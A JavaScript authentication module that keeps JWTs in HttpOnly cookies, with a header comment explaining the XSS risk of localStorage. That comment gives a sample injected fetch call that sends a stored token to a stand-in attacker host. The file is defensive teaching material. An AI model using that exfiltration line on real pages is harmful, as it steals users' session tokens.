/**
 * Authentication Handler
 *
 * SECURITY NOTE — Why we do NOT use localStorage or sessionStorage for JWTs:
 *
 * Both localStorage and sessionStorage are accessible via JavaScript running
 * in the page (i.e., window.localStorage / window.sessionStorage). This means
 * that ANY JavaScript — including malicious scripts injected through an XSS
 * (Cross-Site Scripting) vulnerability — can read, copy, or exfiltrate the
 * token silently without the user's knowledge.
 *
 * Attack scenario:
 *   1. An attacker finds an XSS vector in your app (e.g., unsanitised user
 *      content rendered as HTML, a compromised third-party script, a DOM-based
 *      injection, etc.).
 *   2. The injected script executes:
 *        fetch('https://evil.example.com/steal?t=' + localStorage.getItem('jwt'));
 *   3. The attacker now holds a valid JWT and can impersonate the user for the
 *      token's entire lifetime — with no way for the server to know the
 *      credential was stolen.
 *
 * The correct alternative — HttpOnly cookies:
 *   • The server sets the JWT inside a cookie flagged as HttpOnly (and ideally
 *     Secure + SameSite=Strict/Lax).
 *   • HttpOnly cookies are NEVER readable by JavaScript — document.cookie will
 *     not expose them — so XSS cannot exfiltrate the token.
 *   • The browser attaches the cookie automatically on every qualifying
 *     same-origin (or allowed cross-origin) request.
 *   • Combined with CSRF protections (SameSite cookie attribute, or a separate
 *     CSRF token in a header), this is the recommended approach for web apps.
 *
 * Server-side cookie header example (what your backend should send):
 *   Set-Cookie: token=<JWT>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
 */

// ---------------------------------------------------------------------------
// Login — sends credentials to the server, which responds by setting an
// HttpOnly cookie containing the JWT. We never touch the token ourselves.
// ---------------------------------------------------------------------------
async function login(username, password) {
  const loginEndpoint = '/api/auth/login';

  let response;
  try {
    response = await fetch(loginEndpoint, {
      method: 'POST',

      // 'include' tells fetch to send cookies on cross-origin requests too.
      // For same-origin APIs, 'same-origin' is sufficient (and safer).
      credentials: 'same-origin',

      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username, password }),
    });
  } catch (networkError) {
    // Network-level failure (offline, DNS error, etc.)
    throw new Error(`Network error during login: ${networkError.message}`);
  }

  if (!response.ok) {
    const errorBody = await response.json().catch(() => ({}));
    throw new Error(
      `Login failed [${response.status}]: ${errorBody.message ?? 'Unknown error'}`
    );
  }

  const data = await response.json();

  // At this point the server has already issued the HttpOnly cookie.
  // We intentionally do NOT read or store any token — it lives only in the
  // cookie jar managed by the browser, invisible to JavaScript.

  return {
    success: true,
    user: data.user ?? null, // non-sensitive user info returned in the JSON body
  };
}

// ---------------------------------------------------------------------------
// Authenticated request — the browser automatically attaches the HttpOnly
// cookie, so we simply make normal fetch calls with credentials: 'same-origin'.
// ---------------------------------------------------------------------------
async function fetchWithAuth(url, options = {}) {
  const response = await fetch(url, {
    ...options,
    // Ensures cookies (including our HttpOnly auth cookie) are sent.
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json',
      ...(options.headers ?? {}),
    },
  });

  if (response.status === 401) {
    // Token expired or invalid — redirect to login.
    handleSessionExpired();
    return null;
  }

  if (!response.ok) {
    throw new Error(`Request failed [${response.status}]: ${url}`);
  }

  return response.json();
}

// ---------------------------------------------------------------------------
// Logout — asks the server to invalidate the session / clear the cookie.
// We cannot clear an HttpOnly cookie from JavaScript — that is precisely
// the security guarantee — so the server must do it via Set-Cookie with
// Max-Age=0 or an expired date.
// ---------------------------------------------------------------------------
async function logout() {
  try {
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'same-origin',
    });
  } finally {
    // Redirect regardless of whether the server call succeeded, so the user
    // is not left in a broken authenticated-looking state.
    handleSessionExpired();
  }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function handleSessionExpired() {
  // Clear any non-sensitive UI state stored in memory, then redirect.
  appState.currentUser = null;
  window.location.href = '/login';
}

// Minimal in-memory application state (never contains the token).
const appState = {
  currentUser: null,
};

// ---------------------------------------------------------------------------
// Example usage
// ---------------------------------------------------------------------------
document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('login-form');

  if (form) {
    form.addEventListener('submit', async (event) => {
      event.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value;

      try {
        const result = await login(username, password);

        if (result.success) {
          appState.currentUser = result.user;
          console.info('Logged in as:', result.user?.name ?? 'unknown');

          // Example authenticated API call — cookie sent automatically.
          const profile = await fetchWithAuth('/api/user/profile');
          console.info('Profile data:', profile);
        }
      } catch (err) {
        console.error('Authentication error:', err.message);
        // Display error to user via the DOM, never via alert() in production.
        const errorEl = document.getElementById('error-message');
        if (errorEl) {
          errorEl.textContent = err.message;
        }
      }
    });
  }

  const logoutBtn = document.getElementById('logout-btn');
  if (logoutBtn) {
    logoutBtn.addEventListener('click', logout);
  }
});